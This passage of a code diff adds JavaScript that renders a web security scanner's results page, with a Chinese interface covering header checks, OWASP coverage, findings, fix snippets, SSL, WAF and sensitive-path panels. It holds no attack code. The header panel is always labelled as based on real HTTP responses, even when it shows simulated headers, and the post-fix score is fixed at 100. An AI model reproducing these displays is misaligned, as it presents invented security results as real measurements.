+  });
+  html += '</tbody></table>';
+  html += '</div>';
+  html += '<p style="margin:12px 0 0 0;font-size:11px;color:var(--text-light);line-height:1.5">提示：以上为基于当前扫描结果的修复预估效果，实际效果取决于修复配置的应用完整度。</p>';
+  html += '</div>';
+
+  // Radar chart (5 维度)
+  html += '<div class="card fade-in-up" style="animation-delay:0.12s;text-align:center;padding:20px">';
+  html += '<div class="card-title">安全维度雷达图</div>';
+  html += buildRadarSvg(data);
+  html += '</div>';
+
+  // AI Advisor
+  html += '<div class="ai-advisor fade-in-up" style="animation-delay:0.15s">';
+  html += '<div class="ai-avatar">AI</div>';
+  html += '<div class="ai-bubble">';
+  html += '<div class="ai-tag">安全顾问</div>';
+  html += '<p>' + escapeHtml(data.ai_report.summary) + '</p>';
+  html += '<div class="priority">优先处理：' + escapeHtml(data.ai_report.priority) + '</div>';
+  html += '</div></div>';
+
+  // Export actions
+  html += '<div class="card fade-in-up" style="animation-delay:0.2s">';
+  html += '<div class="card-title">导出</div>';
+  html += '<p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">发现 ' + data.findings.length + ' 个问题，导出报告与修复配置</p>';
+  html += '<div style="display:flex;gap:10px;flex-wrap:wrap">';
+  html += '<button class="fixer-btn primary" onclick="downloadReport(\'pdf\')">下载 PDF 报告</button>';
+  html += '<button class="fixer-btn secondary" onclick="downloadAllFixes()">导出修复配置包</button>';
+  html += '</div>';
+  html += '</div>';
+
+  // OWASP
+  html += '<div class="card fade-in-up" style="animation-delay:0.25s">';
+  html += '<div class="card-title">OWASP Top 10 覆盖</div>';
+  data.owasp_coverage.forEach(function(item) {
+    let statusClass = item.status === '通过' ? 'pass' : item.status === '高风险' ? 'fail' : item.status === '低风险' ? 'warn' : 'unknown';
+    let barClass = item.status === '通过' ? 'pass' : item.status === '高风险' ? 'fail' : item.status === '低风险' ? 'warn' : 'unknown';
+    html += '<div class="owasp-item">';
+    html += '<span class="owasp-label">' + escapeHtml(item.category) + '</span>';
+    html += '<div class="owasp-bar-wrap"><div class="owasp-bar ' + barClass + '"></div></div>';
+    html += '<span class="owasp-status ' + statusClass + '">' + escapeHtml(item.status) + '</span>';
+    html += '</div>';
+  });
+  html += '</div>';
+  html += '<div class="card fade-in-up" style="animation-delay:0.28s">';
+  html += '<div class="card-title">响应头检测';
+  if (true) {
+    html += ' <span style="font-size:12px;color:var(--success);font-weight:400">(基于真实 HTTP 响应)</span>';
+  }
+  html += '</div>';
+  html += '<div class="code-block" style="font-size:12px;line-height:2">';
+
+  if ( data.header_details && data.header_details.length > 0) {
+    // Real scan: show actual headers
+    html += '<div style="color:#64748b">HTTP/1.1 200 OK</div>';
+    html += '<div>Date: ' + new Date().toUTCString() + '</div>';
+    // Show raw headers summary
+    if (data.raw_headers) {
+      let rh = data.raw_headers;
+      if (rh['server']) {
+        html += '<div>Server: <span style="color:#f0a732">' + escapeHtml(rh['server']) + '</span> <span style="color:var(--text-lighter)"><- 暴露版本信息</span></div>';
+      }
+      if (rh['content-type']) {
+        html += '<div>Content-Type: ' + escapeHtml(rh['content-type'].split(';')[0]) + '</div>';
+      }
+    }
+    html += '<div style="color:#94a3b8;margin-top:4px">--- Security Headers ---</div>';
+    // Show each header detail
+    data.header_details.forEach(function(h) {
+      if (h.status === 'present') {
+        html += '<div style="color:var(--success)">' + escapeHtml(h.name) + ': ' + escapeHtml(h.value || '(已配置)') + ' [已配置]</div>';
+      } else if (h.status === 'missing') {
+        html += '<div style="color:var(--danger)">' + escapeHtml(h.name) + ': <span style="color:var(--text-lighter)">[缺失]</span> </div>';
+      } else if (h.status === 'leak') {
+        html += '<div style="color:#f0a732">' + escapeHtml(h.name) + ': <span style="color:#f0a732">' + escapeHtml(h.value) + '</span> 注意： 信息泄露</div>';
+      } else if (h.status === 'warning') {
+        html += '<div style="color:#f0a732">' + escapeHtml(h.name) + ': <span style="color:#f0a732">' + escapeHtml(h.value || '') + '</span> 注意： 配置风险</div>';
+      } else if (h.status === 'not_set') {
+        html += '<div style="color:var(--text-lighter)">' + escapeHtml(h.name) + ': <span style="color:var(--text-lighter)">[未设置]</span></div>';
+      }
+    });
+  } else {
+    // Offline mode: simulated headers (legacy behavior)
+    html += '<div style="color:#64748b">HTTP/1.1 200 OK</div>';
+    html += '<div>Server: <span style="color:#f0a732">nginx/1.18.0</span> <span style="color:var(--text-lighter)"><- 暴露版本信息</span></div>';
+    html += '<div>Date: ' + new Date().toUTCString() + '</div>';
+    html += '<div>Content-Type: text/html; charset=utf-8</div>';
+    if (data.score >= 50) {
+      html += '<div style="color:var(--success)">X-Frame-Options: DENY [已配置]</div>';
+    } else {
+      html += '<div style="color:var(--danger)">X-Frame-Options: <span style="color:var(--text-lighter)">[缺失]</span></div>';
+    }
+    if (data.score >= 60) {
+      html += '<div style="color:var(--success)">X-Content-Type-Options: nosniff </div>';
+    } else {
+      html += '<div style="color:var(--danger)">X-Content-Type-Options: <span style="color:var(--text-lighter)">[缺失]</span> </div>';
+    }
+    if (data.score >= 70) {
+      html += '<div style="color:var(--success)">Strict-Transport-Security: max-age=31536000 </div>';
+    } else {
+      html += '<div style="color:var(--danger)">Strict-Transport-Security: <span style="color:var(--text-lighter)">[缺失]</span> </div>';
+    }
+    if (data.score >= 65) {
+      html += '<div style="color:var(--success)">Content-Security-Policy: default-src &#x27;self&#x27; </div>';
+    } else {
+      html += '<div style="color:var(--danger)">Content-Security-Policy: <span style="color:var(--text-lighter)">[缺失]</span> </div>';
+    }
+  }
+  html += '</div></div>';
+
+  // Findings - Burp workbench layout: left list + right detail
+  html += '<div class="section-title fade-in-up" style="animation-delay:0.3s">漏洞详情 / Findings</div>';
+  // 11-S: 0 漏洞时显示提示
+  if (!data.findings || data.findings.length === 0) {
+    html += '<div class="card fade-in-up" style="animation-delay:0.35s;text-align:center;padding:40px 20px;background:#3c3f41;border:1px solid #555555">';
+    html += '<h3 style="margin:0 0 8px;color:#73c990;font-size:16px">安全状况良好</h3>';
+    html += '<p style="color:var(--text-secondary);margin:0 0 16px;font-size:13px;line-height:1.6">本次扫描未发现明显的安全配置问题。<br/>建议定期扫描，持续监控网站安全状态。</p>';
+    html += '<div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap">';
+    html += '<button onclick="navigateTo(\'scan\')" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:8px 16px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:500">重新扫描</button>';
+    html += '<button onclick="navigateTo(\'evolution\')" style="background:transparent;color:var(--text);border:1px solid var(--border);padding:8px 16px;border-radius:2px;cursor:pointer;font-size:12px">查看进化中心</button>';
+    html += '</div></div>';
+  }
+  // 11-S: 给没有置信度的 finding 自动设置默认值（响应头检测=高，敏感路径=中，信息泄露=高）
+  data.findings.forEach(function(f) {
+    if (!f.confidence_level && typeof f.confidence !== 'number') {
+      let name = f.name || '';
+      if (name.indexOf('缺少') === 0 || name.indexOf('HSTS') >= 0 || name.indexOf('CSP') >= 0 || name.indexOf('X-Frame') >= 0 || name.indexOf('X-Content') >= 0 || name.indexOf('Referrer') >= 0 || name.indexOf('Permissions') >= 0) {
+        f.confidence_level = '高';
+        f.cv_reason = '响应头确定性检测';
+      } else if (name.indexOf('敏感路径') >= 0 || name.indexOf('敏感文件') >= 0 || name.indexOf('目录') >= 0) {
+        f.confidence_level = '中';
+        f.cv_reason = 'HTTP 状态码推断';
+      } else if (name.indexOf('信息泄露') >= 0 || name.indexOf('Server') >= 0 || name.indexOf('版本') >= 0) {
+        f.confidence_level = '高';
+        f.cv_reason = '响应头内容匹配';
+      } else {
+        f.confidence_level = '中';
+        f.cv_reason = '启发式检测';
+      }
+    }
+  });
+  let listHtml = '';
+  let detailHtml = '';
+  data.findings.forEach(function(f, i) {
+    let levelClass = getRiskClass(f.level);
+    let scanIdForFeedback = data.scan_id || data.id || 0;
+    let fbInitial = (data.finding_feedback_map && data.finding_feedback_map[f.name]) || null;
+    let fpClass = fbInitial && fbInitial.is_false_positive ? ' fp-marked' : '';
+    let confClass = fbInitial && fbInitial.is_confirmed ? ' confirmed' : '';
+    
+    // 11-S: 优先级标签
+    let priorityLabel = '';
+    let priorityClass = '';
+    let fLevel = f.level || f.severity || '';
+    if (fLevel === '严重' || fLevel === 'critical' || fLevel === '高风险' || fLevel === '高危') {
+      priorityLabel = '紧急';
+      priorityClass = 'priority-urgent';
+    } else if (fLevel === '中风险' || fLevel === '中危' || fLevel === 'medium') {
+      priorityLabel = '重要';
+      priorityClass = 'priority-important';
+    } else {
+      priorityLabel = '一般';
+      priorityClass = 'priority-normal';
+    }
+    
+    // Left panel list item
+    let sevDotClass = levelClass;
+    listHtml += '<div class="result-list-item' + (i === 0 ? ' active' : '') + '" id="finding-list-' + i + '" onclick="selectFinding(' + i + ')" role="button" tabindex="0" onkeydown="if(event.key===\'Enter\'||event.key===\' \'){event.preventDefault();selectFinding(' + i + ');}">';
+    listHtml += '<div class="finding-name">' + escapeHtml(f.name) + '</div>';
+    listHtml += '<div class="finding-meta"><span class="severity-dot ' + sevDotClass + '"></span><span>' + escapeHtml(f.level) + '</span><span class="severity-tag ' + priorityClass + '">' + priorityLabel + '</span></div>';
+    listHtml += '</div>';
+    // Right panel detail
+    detailHtml += '<div class="finding-detail' + (i === 0 ? ' active' : '') + '" id="finding-detail-' + i + '" data-finding-name="' + escapeHtml(f.name) + '" data-scan-id="' + scanIdForFeedback + '">';
+    detailHtml += '<div class="finding-detail-header">';
+    detailHtml += '<span class="finding-level ' + levelClass + '">' + escapeHtml(f.level) + '</span>';
+    detailHtml += '<span class="finding-name">' + escapeHtml(f.name) + '</span>';
+    detailHtml += '<span class="finding-priority ' + priorityClass + '">' + priorityLabel + '</span>';
+    if (fbInitial && fbInitial.is_false_positive) {
+      detailHtml += '<span class="fp-badge">已被标记为误报</span>';
+    } else if (fbInitial && fbInitial.is_confirmed) {
+      detailHtml += '<span class="confirmed-badge">已确认</span>';
+    }
+    detailHtml += '</div>';
+    detailHtml += '<div class="finding-detail-body">';
+    detailHtml += '<div class="finding-section"><h4>问题摘要</h4><p>' + escapeHtml(f.summary) + '</p></div>';
+    detailHtml += '<div class="finding-section"><h4>OWASP 分类</h4><p>' + escapeHtml(f.owasp) + '</p></div>';
+    // 漏洞定位信息
+    if (f.location && f.location.target) {
+      detailHtml += '<div class="finding-section" style="background:#313335;border:1px solid #555555;"><h4>漏洞定位</h4>';
+      detailHtml += '<div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:6px">';
+      detailHtml += '<span style="background:#45494a;color:#bbbbbb;padding:4px 10px;border-radius:2px;font-size:12px;font-weight:600">' + escapeHtml(f.location.target) + '</span>';
+      if (f.location.detail) {
+        detailHtml += '<span style="background:#45494a;color:#bbbbbb;padding:4px 10px;border-radius:2px;font-size:12px">' + escapeHtml(f.location.detail) + '</span>';
+      }
+      detailHtml += '</div></div>';
+    }
+    detailHtml += '<div class="finding-section"><h4>智能分析</h4><p>' + escapeHtml(f.ai_advice).replace(/\n/g, '<br>') + '</p></div>';
+    detailHtml += '<div class="finding-section"><h4>修复建议</h4><p>' + escapeHtml(f.fix) + '</p></div>';
+    // 判断依据 evidence
+    let evidenceText = '';
+    if (f.evidence) {
+      if (f.evidence.header && f.name.indexOf('缺少') === 0) {
+        evidenceText = '命中响应头缺失：' + f.evidence.header;
+      } else if (f.evidence.reason && (f.name.indexOf('敏感路径') >= 0 || f.name.indexOf('敏感文件') >= 0)) {
+        evidenceText = '命中内容特征：' + f.evidence.reason;
+      } else if (f.name.indexOf('robots.txt') >= 0 || f.name.indexOf('Robots') >= 0) {
+        evidenceText = 'robots.txt 是公开协议文件，仅作为信息项展示';
+      } else if (f.evidence.reason) {
+        evidenceText = f.evidence.reason;
+      }
+    }
+    if (evidenceText) {
+      detailHtml += '<div style="margin-top:6px;font-size:12px;color:var(--text-lighter);border-top:1px dashed var(--border);padding-top:6px">判断依据：' + escapeHtml(evidenceText) + '</div>';
+    }
+    // 技术验证细节（evidence）
+    if (f.evidence) {
+      let eviHtml = renderEvidence(f.evidence);
+      if (eviHtml) {
+        detailHtml += '<details class="finding-section" style="cursor:pointer"><summary style="font-weight:600;font-size:13px;color:var(--text-primary);padding:6px 0;list-style:none">展开技术细节</summary><div style="background:#313335;border:1px solid #555555;padding:10px;border-radius:2px;margin-top:6px">' + eviHtml + '</div></details>';
+      } else {
+        detailHtml += '<details class="finding-section" style="cursor:pointer"><summary style="font-weight:600;font-size:13px;color:var(--text-primary);padding:6px 0;list-style:none">展开技术细节</summary><div style="background:#313335;border:1px solid #555555;padding:10px;border-radius:2px;margin-top:6px;font-size:12px;color:var(--text-lighter)">无额外技术细节</div></details>';
+      }
+    }
+    // 多平台修复建议 Tab
+    if (f.fixes && Object.keys(f.fixes).length > 0) {
+      let fixPlatforms = f.fixes;
+      let platformNames = {
+        nginx: "Nginx", apache: "Apache", express: "Express",
+        flask: "Flask/FastAPI", spring_boot: "Spring Boot", cloudflare: "Cloudflare"
+      };
+      let platformOrder = ["nginx", "apache", "express", "flask", "spring_boot", "cloudflare"];
+      let availablePlatforms = platformOrder.filter(function(p) { return fixPlatforms[p] && fixPlatforms[p].length > 0 });
+      if (availablePlatforms.length > 0) {
+        let findingIdx = i;
+        detailHtml += '<div style="margin-top:8px">';
+        detailHtml += '<div style="display:flex;gap:4px;margin-bottom:8px;flex-wrap:wrap">';
+        availablePlatforms.forEach(function(p, pi) {
+          let active = pi === 0;
+          detailHtml += '<button onclick="switchFixPlatform(\'' + p + '\', \'finding-fix-\')" id="finding-fix-tab-' + p + '" style="padding:4px 10px;border-radius:2px;border:1px solid ' + (active ? 'var(--primary)' : 'var(--border)') + ';background:' + (active ? 'var(--primary)' : 'transparent') + ';color:' + (active ? '#fff' : 'var(--text-secondary)') + ';cursor:pointer;font-size:12px">' + platformNames[p] + '</button>';
+        });
+        detailHtml += '</div>';
+        availablePlatforms.forEach(function(p, pi) {
+          let display = pi === 0 ? 'block' : 'none';
+          detailHtml += '<div id="finding-fix-content-' + p + '" style="display:' + display + '">';
+          fixPlatforms[p].forEach(function(fix, fi) {
+            let code = typeof fix === 'string' ? fix : (fix.code || '');
+            let riskNote = typeof fix === 'object' ? (fix.risk_note || '') : '';
+            let copyId = 'fix-copy-' + p + '-' + fi;
+            detailHtml += '<div style="position:relative;margin-bottom:6px">';
+            detailHtml += '<pre style="background:#2b2b2b;border:1px solid #555555;padding:10px;padding-right:50px;border-radius:2px;font-size:12px;overflow-x:auto;white-space:pre-wrap;margin:0">' + escapeHtml(code) + '</pre>';
+            detailHtml += '<button onclick="copyFixCode(\'' + copyId + '\')" id="' + copyId + '-btn" aria-label="复制修复代码" style="position:absolute;top:6px;right:6px;padding:6px 12px;min-height:0;background:#45494a;color:#bbbbbb;border:1px solid #555555;border-radius:2px;font-size:12px;font-weight:600;cursor:pointer;transition:background 0.15s" onmouseover="this.style.background=\'#4b6eaf\';this.style.color=\'#fff\'" onmouseout="this.style.background=\'#45494a\';this.style.color=\'#bbbbbb\'">复制</button>';
+            detailHtml += '<textarea id="' + copyId + '" style="position:absolute;left:-9999px">' + escapeHtml(code) + '</textarea>';
+            detailHtml += '</div>';
+            if (riskNote) {
+              detailHtml += '<div style="font-size:12px;color:#f0a732;padding:4px 8px;background:#3d2929;border-radius:2px;margin-bottom:6px">注意：' + escapeHtml(riskNote) + '</div>';
+            }
+          });
+          detailHtml += '</div>';
+        });
+        detailHtml += '</div>';
+      }
+    }
+    if (f.remediation) {
+      detailHtml += '<div class="finding-section"><h4>修复步骤</h4><ul>';
+      (f.remediation.steps || []).forEach(function(s) {
+        detailHtml += '<li>' + escapeHtml(s) + '</li>';
+      });
+      detailHtml += '</ul></div>';
+      if (f.remediation.nginx) {
+        detailHtml += '<div class="finding-section"><h4>Nginx 配置</h4><div class="code-block">' + escapeHtml(f.remediation.nginx) + '</div></div>';
+      }
+      if (f.remediation.apache) {
+        detailHtml += '<div class="finding-section"><h4>Apache 配置</h4><div class="code-block">' + escapeHtml(f.remediation.apache) + '</div></div>';
+      }
+      if (f.remediation.node) {
+        detailHtml += '<div class="finding-section"><h4>Node.js 配置</h4><div class="code-block">' + escapeHtml(f.remediation.node) + '</div></div>';
+      }
+      if (f.remediation.verify) {
+        detailHtml += '<div class="finding-section"><h4>验证方法</h4><p>' + escapeHtml(f.remediation.verify) + '</p></div>';
+      }
+    }
+    // 11-S: 详细验证步骤（三步验证法）
+    if (f.verify_steps && f.verify_steps.length > 0) {
+      detailHtml += '<div class="finding-section">';
+      detailHtml += '<h4>验证修复（三步验证法）</h4>';
+      detailHtml += '<div style="display:flex;flex-direction:column;gap:10px;margin-top:8px">';
+      f.verify_steps.forEach(function(step, idx) {
+        let stepLabels = ['1.', '2.', '3.'];
+        let stepLabel = stepLabels[idx] || (idx+1) + '.';
+        detailHtml += '<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:10px 12px;border-left:3px solid var(--success)">';
+        detailHtml += '<div style="display:flex;align-items:center;gap:6px;margin-bottom:6px">';
+        detailHtml += '<span style="font-size:12px;font-weight:700;color:var(--text-primary)">第 ' + (idx+1) + ' 步：' + escapeHtml(step.method || '验证') + '</span>';
+        detailHtml += '</div>';
+        if (step.command) {
+          detailHtml += '<div style="font-size:12px;color:var(--text-secondary);margin-bottom:5px">操作：</div>';
+          detailHtml += '<pre style="margin:0 0 6px 0;padding:6px 8px;background:#0f172a;color:#a7f3d0;border-radius:2px;font-size:12px;line-height:1.4;overflow-x:auto;white-space:pre-wrap;word-break:break-all">' + escapeHtml(step.command) + '</pre>';
+        }
+        if (step.expect) {
+          detailHtml += '<div style="font-size:12px;color:var(--text-secondary);display:flex;align-items:flex-start;gap:4px">';
+          detailHtml += '<span style="color:#73c990;font-weight:700;flex-shrink:0">预期：</span>';
+          detailHtml += '<span style="color:var(--text-primary)">' + escapeHtml(step.expect) + '</span>';
+          detailHtml += '</div>';
+        }
+        detailHtml += '</div>';
+      });
+      detailHtml += '</div>';
+      detailHtml += '<div style="margin-top:8px;padding:6px 10px;background:rgba(115,201,144,0.08);border-radius:2px;font-size:12px;color:#15803d;border:1px solid rgba(115,201,144,0.2)">';
+      detailHtml += '<strong>提示：</strong>建议按顺序执行三步验证，全部通过后再使用本工具重新扫描确认。';
+      detailHtml += '</div>';
+      detailHtml += '</div>';
+    } else if (f.verify_method) {
+      // 兼容旧格式：只有一句话验证方法
+      detailHtml += '<div class="finding-section"><h4>验证方法</h4><p>' + escapeHtml(f.verify_method) + '</p></div>';
+    }
+    // 证据详情
+    if (f.evidence && Object.keys(f.evidence).length > 0) {
+      detailHtml += '<div style="margin-top:8px;padding:10px;background:var(--bg-secondary);border-radius:2px;font-size:12px">';
+      detailHtml += '<div style="font-weight:600;margin-bottom:4px;color:var(--primary)">证据详情</div>';
+      let _eviDetailHtml = renderEvidence(f.evidence);
+      if (_eviDetailHtml) {
+        detailHtml += _eviDetailHtml;
+      } else {
+        detailHtml += '<div style="color:var(--text-lighter)">无额外技术细节</div>';
+      }
+      detailHtml += '</div>';
+    }
+    // 11-S 置信度（高/中/低）+ 误报反馈行
+    let confLevel = f.confidence_level || '';
+    let conf = (typeof f.confidence === 'number') ? f.confidence : null;
+    let cvReason = f.cv_reason || '';
+    let confClassName = 'finding-confidence';
+    // 优先用 confidence_level 映射样式
+    if (confLevel === '高') confClassName += ' high';
+    else if (confLevel === '中') confClassName += ' medium';
+    else if (confLevel === '低') confClassName += ' low';
+    else if (conf !== null) {
+      if (conf >= 80) confClassName += ' high';
+      else if (conf >= 60) confClassName += ' medium';
+      else confClassName += ' low';
+    }
+    detailHtml += '<div class="finding-feedback-row" data-finding-name="' + escapeHtml(f.name) + '" data-scan-id="' + scanIdForFeedback + '">';
+    detailHtml += '<span style="color:var(--text-light)">置信度</span>';
+    if (confLevel) {
+      detailHtml += '<span class="' + confClassName + '">' + escapeHtml(confLevel) + '</span>';
+    } else if (conf !== null) {
+      detailHtml += '<span class="' + confClassName + '">' + conf + '%</span>';
+    } else {
+      detailHtml += '<span class="' + confClassName + '">未评估</span>';
+    }
+    if (cvReason) {
+      detailHtml += '<span style="font-size:12px;color:var(--text-lighter)">· ' + escapeHtml(cvReason) + '</span>';
+    }
+    // 建议人工复核标签（suspect 项）
+    if (f.review_required || confLevel === '中') {
+      detailHtml += '<span style="font-size:11px;background:var(--warning);color:#000;padding:1px 6px;border-radius:2px;margin-left:6px">建议人工复核</span>';
+    }
+    // 反馈按钮
+    let btnDisabled = (fbInitial && (fbInitial.is_false_positive || fbInitial.is_confirmed)) ? ' disabled' : '';
+    detailHtml += '<button class="finding-feedback-btn btn-confirm" onclick="submitFindingFeedback(this, \'' + escapeAttr(f.name) + '\', ' + scanIdForFeedback + ', false)" ' + btnDisabled + '>准确</button>';
+    detailHtml += '<button class="finding-feedback-btn btn-fp" onclick="submitFindingFeedback(this, \'' + escapeAttr(f.name) + '\', ' + scanIdForFeedback + ', true)" ' + btnDisabled + '>误报</button>';
+    if (fbInitial && fbInitial.is_false_positive) {
+      detailHtml += '<span class="fp-reason-text">已标记为误报，将用于优化未来检测</span>';
+    } else if (fbInitial && fbInitial.is_confirmed) {
+      detailHtml += '<span class="fp-reason-text" style="color:#73c990">已确认为真实漏洞，感谢您的反馈</span>';
+    }
+    detailHtml += '</div>';
+    detailHtml += '</div></div>';
+  });
+  // Assemble workbench
+  if (data.findings && data.findings.length > 0) {
+    html += '<div class="result-workbench">';
+    html += '<div class="result-list-panel"><div class="result-list-header">Findings (' + data.findings.length + ')</div><div class="result-list">' + listHtml + '</div></div>';
+    html += '<div class="result-detail-panel" id="result-detail-panel">' + detailHtml + '</div>';
+    html += '</div>';
+  }
+
+  // 修复建议 - 多平台 Tab（报告级别）
+  if (data.fixes && Object.keys(data.fixes).length > 0) {
+    let fixPlatforms = data.fixes;
+    let platformNames = {
+      nginx: "Nginx", apache: "Apache", express: "Express",
+      flask: "Flask/FastAPI", spring_boot: "Spring Boot", cloudflare: "Cloudflare"
+    };
+    let platformOrder = ["nginx", "apache", "express", "flask", "spring_boot", "cloudflare"];
+    let availablePlatforms = platformOrder.filter(function(p) { return fixPlatforms[p] && fixPlatforms[p].length > 0 });
+
+    if (availablePlatforms.length > 0) {
+      html += '<div class="card fade-in-up" style="animation-delay:0.3s;border:2px solid rgba(115,201,144,0.4);background:#3c3f41,rgba(115,201,144,0.01))">';
+      html += '<div style="font-weight:700;font-size:16px;margin-bottom:10px;color:var(--success)"> 修复建议（' + availablePlatforms.length + ' 种服务器平台）</div>';
+      html += '<div style="display:flex;gap:4px;margin-bottom:12px;flex-wrap:wrap">';
+      availablePlatforms.forEach(function(p, i) {
+        let active = i === 0;
+        html += '<button onclick="switchFixPlatform(\'' + p + '\')" id="fix-tab-' + p + '" style="padding:6px 14px;border-radius:2px;border:1px solid ' + (active ? 'var(--primary)' : 'var(--border)') + ';background:' + (active ? 'var(--primary)' : 'transparent') + ';color:' + (active ? '#fff' : 'var(--text-secondary)') + ';cursor:pointer;font-size:12px">' + platformNames[p] + '</button>';
+      });
+      html += '</div>';
+      availablePlatforms.forEach(function(p, i) {
+        let display = i === 0 ? 'block' : 'none';
+        html += '<div id="fix-content-' + p + '" style="display:' + display + '">';
+        fixPlatforms[p].forEach(function(fix) {
+          let code = typeof fix === 'string' ? fix : (fix.code || '');
+          let riskNote = typeof fix === 'object' ? (fix.risk_note || '') : '';
+          html += '<pre style="background:var(--bg-secondary);padding:12px;border-radius:2px;font-size:12px;overflow-x:auto;white-space:pre-wrap;margin-bottom:8px">' + escapeHtml(code) + '</pre>';
+          if (riskNote) {
+            html += '<div style="font-size:12px;color:#f0a732;padding:4px 8px;background:rgba(240,167,50,0.1);border-radius:2px;margin-bottom:8px">注意： ' + escapeHtml(riskNote) + '</div>';
+          }
+        });
+        html += '</div>';
+      });
+      html += '</div>';
+    }
+  }
+
+  // Generate Fix
+  html += '<div class="gen-fix-section fade-in-up" style="animation-delay:0.4s">';
+  html += '<h3> 一键生成修复配置</h3>';
+  html += '<p class="card-desc" style="margin-bottom:14px">输入您的 Nginx 配置，系统将根据扫描结果自动生成安全补丁</p>';
+  html += '<div class="gen-fix-row">';
+  html += '<input type="text" id="gen-fix-input" placeholder="粘贴 Nginx 配置或输入 server 块..." />';
+  html += '<button class="gen-fix-btn" onclick="generateFixFromResult()"> 生成</button>';
+  html += '</div>';
+  html += '<div id="gen-fix-output"></div>';
+  html += '</div>';
+
+  // 修复后：所有 finding 全部消除，仅保留修复加成（最多 100）
+  let fixedScore = Math.min(100, 100 + 12);
+  html += '<div class="score-compare fade-in-up" style="animation-delay:0.45s">';
+  html += '<h3> 修复后评分对比</h3>';
+  html += '<div class="score-rings">';
+  html += '<div class="score-ring-item">';
+  html += '<div class="ring" style="background:' + getScoreGradient(data.score) + '">';
+  html += '<div class="val" style="color:#fff">' + data.score + '</div>';
+  html += '<div class="lbl" style="color:rgba(255,255,255,0.7)">修复前</div>';
+  html += '</div>';
+  html += '<div class="tag">修复前</div>';
+  html += '</div>';
+  html += '<div class="score-ring-item">';
+  html += '<div class="ring" id="score-after-ring" style="background:' + getScoreGradient(fixedScore) + '">';
+  html += '<div class="val" style="color:#fff">' + fixedScore + '</div>';
+  html += '<div class="lbl" style="color:rgba(255,255,255,0.7)">修复后</div>';
+  html += '</div>';
+  html += '<div class="tag">修复后</div>';
+  html += '</div>';
+  html += '</div>';
+  html += '<div class="score-improve" id="score-diff"> 提升 <strong>' + (fixedScore - data.score) + '</strong> 分 <span>（' + data.score + ' -> ' + fixedScore + '）</span></div>';
+  html += '<div class="score-rules"><p>评分规则：基础 100 分 - 高风险(18) - 中风险(10) - 低风险(4) + 修复配置(+12) + PR修复(+10)</p></div>';
+  html += '</div>';
+  if ( data.ssl_info && data.ssl_info.has_cert) {
+    html += '<div class="card fade-in-up" style="animation-delay:0.32s">';
+    html += '<div class="card-title"> SSL 证书信息</div>';
+    let ssl = data.ssl_info;
+    html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:13px">';
+    html += '<div><span style="color:var(--text-lighter)">域名:</span> ' + escapeHtml(ssl.subject || 'N/A') + '</div>';
+    html += '<div><span style="color:var(--text-lighter)">签发机构:</span> ' + escapeHtml(ssl.issuer || 'N/A') + '</div>';
+    html += '<div><span style="color:var(--text-lighter)">TLS 版本:</span> ' + escapeHtml(ssl.version || 'N/A') + '</div>';
+    html += '<div><span style="color:var(--text-lighter)">密码套件:</span> ' + escapeHtml(ssl.cipher || 'N/A') + '</div>';
+    html += '<div><span style="color:var(--text-lighter)">剩余天数:</span> ' + (ssl.days_left != null ? ssl.days_left + ' 天' : 'N/A') + '</div>';
+    html += '<div><span style="color:var(--text-lighter)">过期时间:</span> ' + escapeHtml(ssl.not_after || 'N/A') + '</div>';
+    if (ssl.san && ssl.san.length > 0) {
+      html += '<div style="grid-column:1/-1"><span style="color:var(--text-lighter)">SAN:</span> ' + escapeHtml(ssl.san.join(', ')) + '</div>';
+    }
+    html += '</div>';
+    if (ssl.expired) {
+      html += '<div style="margin-top:8px;padding:6px 10px;background:rgba(199,84,80,0.1);border-radius:2px;color:var(--danger);font-size:12px;font-weight:600">注意： 证书已过期！</div>';
+    } else if (ssl.days_left != null && ssl.days_left < 30) {
+      html += '<div style="margin-top:8px;padding:6px 10px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;font-weight:600">注意： 证书将在 ' + ssl.days_left + ' 天后过期</div>';
+    }
+    if (ssl.weak) {
+      html += '<div style="margin-top:8px;padding:6px 10px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;font-weight:600">注意： 使用弱加密协议/套件</div>';
+    }
+    html += '</div>';
+  }
+  if (data.waf && data.waf.length > 0) {
+    html += '<div class="card fade-in-up" style="animation-delay:0.34s">';
+    html += '<div class="card-title"> WAF 防护检测</div>';
+    html += '<div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:10px">';
+    data.waf.forEach(function(w) {
+      html += '<span style="display:inline-flex;align-items:center;gap:4px;padding:4px 10px;background:rgba(59,130,246,0.15);color:#4b6eaf;border:1px solid rgba(59,130,246,0.3);border-radius:2px;font-size:12px;font-weight:600">' + escapeHtml(w.name) + '</span>';
+    });
+    html += '</div>';
+    // 11-S：明确说明 WAF 不能替代安全响应头
+    html += '<div style="padding:8px 12px;background:rgba(59,130,246,0.06);border-radius:2px;font-size:12px;color:var(--text-light);line-height:1.5">';
+    html += 'WAF 提供应用层防护，但不能替代 HSTS、CSP、Cookie 安全策略等配置。下方发现的缺失项仍需修复。';
+    html += '</div>';
+    html += '</div>';
+  }
+  if ( data.sensitive_paths && data.sensitive_paths.length > 0) {
+    let exposedPaths = data.sensitive_paths.filter(function(p) { return p.exposed; });
+    let suspectPaths = data.sensitive_paths.filter(function(p) { return p.suspect; });
+    let infoPaths = data.sensitive_paths.filter(function(p) { return p.info; });
+    let otherPaths = data.sensitive_paths.filter(function(p) { return !p.exposed && !p.suspect && !p.info; });
+    html += '<div class="card fade-in-up" style="animation-delay:0.36s">';
+    html += '<div class="card-title"> 敏感路径探测</div>';
+    // 确认漏洞（红色）
+    if (exposedPaths.length > 0) {
+      html += '<div style="margin-bottom:12px">';
+      html += '<div style="font-size:13px;font-weight:700;color:var(--danger);margin-bottom:6px;padding:4px 8px;background:rgba(199,84,80,0.08);border-radius:2px;border-left:3px solid var(--danger)"> 确认漏洞 (' + exposedPaths.length + ')</div>';
+      html += '<div style="font-size:12px;line-height:2">';
+      exposedPaths.forEach(function(p) {
